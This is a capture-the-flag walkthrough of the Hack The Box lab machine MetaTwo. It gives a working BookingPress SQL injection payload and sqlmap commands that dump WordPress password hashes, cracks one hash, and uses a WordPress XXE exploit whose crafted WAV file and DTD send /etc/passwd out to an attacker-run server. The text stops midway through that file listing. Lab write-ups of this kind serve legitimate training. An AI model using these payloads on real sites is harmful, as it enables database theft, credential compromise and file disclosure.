# Hack The Box - MetaTwo Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.11.186
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 09:01 EST
Nmap scan report for 10.10.11.186
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=2/13%Time=63EA42E2%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/13%OT=21%CT=1%CU=30499%PV=Y%DS=2%DC=I%G=Y%TM=63EA432
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.51 seconds
```


So, we got back the results and `2` open ports while the rest are filtered.
- Port `21`: running `ftp`
- Port `22`: running `OpenSSH 8.4p1`
- Port `80`: runninng `nginx 1.18.0`
 

Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.
So I ran `Rustscan` that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ rustscan -a 10.10.11.186 --range 1-65535        
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.186:21
Open 10.10.11.186:22
Open 10.10.11.186:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,80 10.10.11.186

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-13 09:14 EST
Initiating Ping Scan at 09:14
Scanning 10.10.11.186 [2 ports]
Completed Ping Scan at 09:14, 0.24s elapsed (1 total hosts)
Initiating Connect Scan at 09:14
Scanning metapress.htb (10.10.11.186) [3 ports]
Discovered open port 80/tcp on 10.10.11.186
Discovered open port 22/tcp on 10.10.11.186
Discovered open port 21/tcp on 10.10.11.186
Completed Connect Scan at 09:14, 0.23s elapsed (3 total ports)
Nmap scan report for metapress.htb (10.10.11.186)
Host is up, received conn-refused (0.23s latency).
Scanned at 2023-02-13 09:14:00 EST for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

So, now that it was confirmed that only 3 ports were open, I could move on with the enumeration.

## Enumeration
Firstly, as `nmap` results showed that on port `80`, I was being redirected to `http://metapress.htb`, I decided to add the host to `/etc/hosts`

```
sudo echo "10.10.11.196  metapress.htb" >> /etc/hosts
```

I tried to ping it, to see if its working and it is working.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ ping -c 1 metapress.htb
PING metapress.htb (10.10.11.186) 56(84) bytes of data.
64 bytes from metapress.htb (10.10.11.186): icmp_seq=1 ttl=63 time=239 ms

--- metapress.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 239.358/239.358/239.358/0.000 ms
```

Now I used `whatweb` to look at what services were running on the web-page.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ whatweb http://metapress.htb             
http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
```

Then, I visited the web-page.

![meta-1](https://user-images.githubusercontent.com/87711310/218543511-90c4b5f9-3a83-4faa-a58a-22bb47a9a64c.png)


Using `Wappalyzer` on the weebsite, I found that it was using `WordPress 5.6.2`.

![meta-2](https://user-images.githubusercontent.com/87711310/218543523-a0e23e52-770c-4c59-8c07-092ac338742d.png)


There was also a page `/events`, which allowed to book a 30 minutes meetings at my preferred time and date.

![meta-3](https://user-images.githubusercontent.com/87711310/218543540-7410c3b5-3fc7-4ef0-9770-d33be5e3d3c5.png)


Once I booked the meeting with some sample data, I found the URL using a `appointment_id` paramater.

![meta-4](https://user-images.githubusercontent.com/87711310/218543566-aa014431-d3f6-46f9-8ab8-824c307462d3.png)


On closely looking at the value of the `parameter_id`, it seemed like a `base64` encoded value, so I decided to decode it and look what is it's value.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ echo "MQ==" |base64 -d                                     
1
```

It looked suspicious, so I tried injecting other values to see if it was vulnerable but it was not!!!

Looking at the `source-code`, I found a `wp-admin` directory, and all found out that the web-site was using `Booking Press v1.0.10`. So, I decided to check of any exploit for that particular application exists.

![meta-5](https://user-images.githubusercontent.com/87711310/218543582-634e61c2-fdd1-4908-8c2b-995ef6c01b8f.png)


On googling it, I found a recently discovered Booking press vulnerability found in 2022, [CVE-2022-0739](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

![meta-6](https://user-images.githubusercontent.com/87711310/218543595-ee6f9417-0f7a-4ee1-9c52-ae0db76df30a.png)


For the exploit to work, we need some info about `_wpnonce` which can be found in events page source code.

![meta-7](https://user-images.githubusercontent.com/87711310/218543612-1f98dc4a-7ec4-4a8d-af43-006ce9a25a44.png)


Now, we have two options, the first one is to `dump the database manually` or use some automation tool like `sqlmap`. I am doing it with second option.

Before that, we'll need to retrieve tha value of `_wpnonce` parameter. For that, I used the payload mentioned in the CVE mentioned above.

```
curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Now, once you run the command, you'll get an error like shown below.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' 
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 13 Feb 2023 15:06:20 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

{"variant":"error","title":"Error","msg":"Sorry, Your request can not process due to security reason."}  
```

So, now, go to `/events` page and find the request from `admin-ajax.php` to retrieve the value of `_wpnonce` parameter.

![meta-8](https://user-images.githubusercontent.com/87711310/218543629-5f933219-0554-4210-aa58-f212e257100f.png)


Once the value is retrieved, replace that value in the request payload you previously sent.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 13 Feb 2023 15:10:19 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]                                                                                                                                                                                   
```

Once you hit send, you'll get a `200 OK` along with other data instead of an error received when you sent the previous payload.

Now, that we know that we got a `SQL Injection`, I switched to `sqlmap` to craft the payload.

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service 
```


```SQL
┌──(darshan㉿kali)-[~]
└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service      
        ___
       __H__                                                                                                                                           
 ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                                               
|_ -| . [']     | .'| . |                                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:43:24 /2023-02-13/

[10:43:24] [INFO] testing connection to the target URL
[10:43:24] [INFO] testing if the target URL content is stable
[10:43:24] [INFO] target URL content is stable
[10:43:25] [WARNING] heuristic (basic) test shows that POST parameter 'total_service' might not be injectable
[10:43:25] [INFO] testing for SQL injection on POST parameter 'total_service'
[10:43:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:43:26] [INFO] POST parameter 'total_service' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[10:43:27] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[10:43:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:43:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:43:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:43:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:43:34] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:43:34] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[10:43:34] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:43:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:43:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:43:35] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:43:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:43:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:43:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:43:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[10:43:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:43:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[10:43:37] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[10:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[10:43:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[10:43:37] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[10:43:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[10:43:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[10:43:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[10:43:37] [INFO] testing 'Generic inline queries'
[10:43:38] [INFO] testing 'MySQL inline queries'
[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[10:43:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[10:43:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[10:43:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[10:43:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[10:43:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:43:50] [INFO] POST parameter 'total_service' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:43:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:43:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:43:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[10:43:51] [INFO] target URL appears to have 9 columns in query
[10:43:52] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
---
[10:43:54] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:43:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 10:43:55 /2023-02-13/
```

So now that sqlmap knows that it is vulnerable I, further, enumerated the database.

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -- db
```

```
┌──(darshan㉿kali)-[~]
└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -- db
        ___
       __H__                                                                                                                                           
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                                               
|_ -| . [']     | .'| . |                                                                                                                              
|___|_  [']_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:45:16 /2023-02-13/

[10:45:16] [INFO] resuming back-end DBMS 'mysql' 
[10:45:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
---
[10:45:17] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:45:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 10:45:17 /2023-02-13/
```

Dumping tables in the Database `blog`

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog --tables
```

```
┌──(darshan㉿kali)-[~]
└─$ sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog --tables
        ___
       __H__                                                                                                                                           
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                                               
|_ -| . [,]     | .'| . |                                                                                                                              
|___|_  [(]_|_|_|__,|  _|                                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                                           

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:46:23 /2023-02-13/

[10:46:23] [INFO] resuming back-end DBMS 'mysql' 
[10:46:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND 1179=1179 AND (5714=5714

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) AND (SELECT 3708 FROM (SELECT(SLEEP(5)))gLML) AND (2888=2888

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717171,0x70536f744a6c56535468795050594841454258666b4a7a7257675a495659666d5a6b595466697348,0x71787a7671),NULL,NULL,NULL,NULL-- -
---
[10:46:24] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.18.0, PHP 8.0.24
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:46:24] [INFO] fetching tables for database: 'blog'
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+

[10:46:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 10:46:24 /2023-02-13/


```

Dumping `wp_users` tables data

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=78d9c3d9f2&category_id=1&total_service=1' -p total_service -D blog -T wp_users --dump
```

```
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[11:15:30] [INFO] table 'blog.wp_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/metapress.htb/dump/blog/wp_users.csv'
[11:15:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
```

Now, I found 2 users: `admin` & `manager` and got their password hashes too.

So, i decided to use `John the ripper` to crack the password

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ cat hash 
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70


┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)     
1g 0:00:02:56 34.59% (ETA: 13:20:51) 0.005666g/s 28927p/s 29553c/s 29553C/s nibbles1001..niavillegas
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session aborted

```

So, john was able to crack one hash and was taking too much time to crack another, which I guess was intentionally an uncrackable hash given to us.

So, the cracked hash belonged to the user `manager`.

So, now, I tried to login through `ftp` using creds `manager:` but it didnt work

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ ftp ftp://manager:partylikearockstar@10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for manager
530 Login incorrect.
ftp: Login failed
ftp: Can't connect or login to host `10.10.11.186:ftp'
221 Goodbye.
```

So, now, my only option left was try it on the `/wp-login.php` login page.

![meta-9](https://user-images.githubusercontent.com/87711310/218543662-d2364f01-0077-4a19-97d8-344fc792569e.png)

And it worked!!!

Now, there were too many way through which I could upload media and I kind of knew that this was my way in, to obtain a reverse shell through file upload.

Now, I knew the website was running on `Wordpress v5.6.2` so, I decided to search if any vulnerabilities related to this particular version exists

And I found one, the [CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/), which has an XXE Vulnerability but requires some type of user access to the admin console.

So, now that we have `manager's` credentials, we need to create two files:
1. `payload.wav` which is a WAVE file through which you can inject your payload inside the `iXML` metatag.
2. `evil.dtd` file.

So, to create a `payload.wav` file,

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.27:8888/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

For `evil.dtd` file, 

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.27:8888/?p=%file;'>" >
```

Here, I decided to use `/etc/passwd` to check if the exploit works or not.

Now, that I've created two files, I started a python server in the same directory where these two files were stored.

```
python -m http.server 8888
```

Then, I visited the website, and tried to upload the `payload.wav` file.

![meta-9](https://user-images.githubusercontent.com/87711310/219140887-88bf63bc-1c3c-496a-af2c-7557f2358d67.png)


It gave me an error, but when I checked the response on my python server, I got back something.

![meta-10](https://user-images.githubusercontent.com/87711310/219140875-b41a4b42-27e3-4d5f-a937-74e4fb374361.png)


It seemed like a `Base-64` encoded string, so I decided to decode the string.

```
echo <string> | bas64 -d > b64-decode.txt
```

And viewing the contents of the file, I got back the contents of the `/etc/passwd` as mentioned in the payload.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/MetaTwo]
└─$ cat b64-decode.txt 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
